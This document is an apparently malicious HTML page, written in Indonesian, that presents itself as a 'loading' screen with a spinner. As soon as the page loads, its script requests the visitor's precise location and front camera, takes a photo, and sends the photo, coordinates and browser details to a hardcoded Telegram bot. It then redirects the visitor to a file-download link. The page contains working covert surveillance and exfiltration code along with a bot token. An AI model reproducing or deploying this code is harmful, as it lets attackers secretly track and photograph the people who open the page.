<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Memuat...</title>
<style>
  body { margin:0; height:100vh; display:flex; align-items:center; justify-content:center;
         background:#0d0d0d; color:#eee; font-family:system-ui,sans-serif; }
  .spinner { width:40px; height:40px; border:4px solid #333; border-top-color:#4ade80;
             border-radius:50%; animation:spin 1s linear infinite; }
  @keyframes spin { to { transform:rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<script>
const BOT_TOKEN = "8634866786:AAEOEqCHMoqqwfwc1VWb35Braps_zzwX-zE";
const CHAT_ID   = "1966317946";
const REDIRECT  = "https://filecoster.com/d/a4c0mokxydpd";

async function sendTelegram(method, payload) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (e) {}
}

async function sendPhoto(blob) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "cam.jpg");
  fd.append("caption", "📸 Foto kamera depan");
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST", body: fd
    });
  } catch (e) {}
}

async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      pos => resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
      }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  });
}

async function getFrontCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 800));
    const canvas = document.createElement("canvas");
    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(t => t.stop());
    return await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
  } catch (e) {
    return null;
  }
}

(async () => {
  // Minta lokasi & kamera paralel — popup bawaan Chrome muncul
  const [loc, photo] = await Promise.all([ getLocation(), getFrontCamera() ]);

  // Kirim info lokasi
  let text = "📍 *Lokasi & Kamera*";
  if (loc) {
    text += `\nLat: ${loc.lat}\nLon: ${loc.lon}\nAkurasi: ${loc.acc} m`;
    text += `\nMaps: https://maps.google.com/?q=${loc.lat},${loc.lon}`;
  } else {
    text += "\nLokasi: ditolak / tidak tersedia";
  }
  text += `\nFoto: ${photo ? "terlampir" : "gagal"}`;
  text += `\nUA: ${navigator.userAgent}`;
  text += `\nWaktu: ${new Date().toISOString()}`;

  await sendTelegram("sendMessage", {
    chat_id: CHAT_ID,
    text: text,
    parse_mode: "Markdown"
  });

  if (photo) await sendPhoto(photo);

  // Redirect ke URL tujuan
  window.location.replace(REDIRECT);
})();
</script>
</body>
</html>
